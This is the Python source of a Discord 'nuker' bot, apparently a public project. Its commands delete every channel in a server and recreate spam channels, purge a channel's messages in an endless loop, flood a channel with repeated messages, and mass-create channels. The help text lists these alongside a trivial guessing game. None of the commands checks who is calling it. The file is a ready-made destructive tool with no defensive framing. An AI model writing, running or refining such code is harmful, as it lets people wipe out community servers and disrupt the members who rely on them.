from discord.ext import commands
__author__ = 'Ongenix - github.com/Ongenix/Simple-Discord-Nuker'

# Default prefix = !
# Help command = !help
# You can fork this just credit me unless you make changes.

bot = commands.Bot(
	command_prefix="!",  # Change to any prefix
	case_insensitive=True  
)
bot.remove_command("help")
bot.author_id = 123456789123456789


@bot.event
async def on_ready():
    print(f"I'm in as {bot.user}")
    print("Default prefix: !")
    print("Commands: do \033[4m\033[1m!help\033[0m\033[0m in Discord")

@bot.command()
async def help(ctx):
  await ctx.send("--Bot Commands--")
  await ctx.send("**REMEMBER** the default prefix is !")
  await ctx.send("1. clear - clears the entire channel")
  await ctx.send(r'2. nuke - nukes the server + adds a new channel "#get-nuked"')
  await ctx.send("3. nuke2 - nukes the server + adds a new channel 'whateverYouWant' = example: !nuke2 i+love+dogs")
  await ctx.send("4. spam - spams text = example: !spam hello+world")
  await ctx.send("5. game - simple guess the number game = example: !game 5 10 (the 5 is your guess, the 10 is the max. Every time you do !game the random number is different.)")
  await ctx.send("6. spamchannel - spams channels = example: !spamchannel hello+world 10")
  await ctx.send("**REMEMBER** spaces are replaced with +")
  await ctx.send("--More soon--")
  
@bot.command()
async def clear(ctx):
  while 1:
    await ctx.channel.purge(limit=100)
@bot.command()
async def nuke(ctx):
  guild = ctx.guild
  for channel in guild.channels:
    try:
      await channel.delete()
    except:pass
  for i in range(10):
    await guild.create_text_channel('get-nuked')
@bot.command()
async def spamchannel(ctx, spam1, amount):
  guild = ctx.guild
  for i in range(int(amount)):await guild.create_text_channel(str(spam1.replace("+", " ")))
#@bot.event
#async def on_message(message):
  #if "!spam" in message.content:
    #await message.delete()
    #while 1:await message.channel.send(message.content.replace(f"!spam ",""))
@bot.command()
async def nuke2(ctx,channel2add):
  for c in ctx.guild.channels:
    await c.delete()
  await ctx.guild.create_text_channel(channel2add.replace("+"," "))
@bot.command()
async def spam(ctx, spamtext):
  while 1:await ctx.send(str(spamtext).replace("+"," "))
@bot.command()
async def game(ctx, guess, max):
  from random import randrange
  if int(guess) == randrange(0,int(max)):
    await ctx.send("Nice! Correct.")
  else:
    await ctx.send("RIP! Wrong..")

token = "put your token here" 
bot.run(token)  # Starts the bot
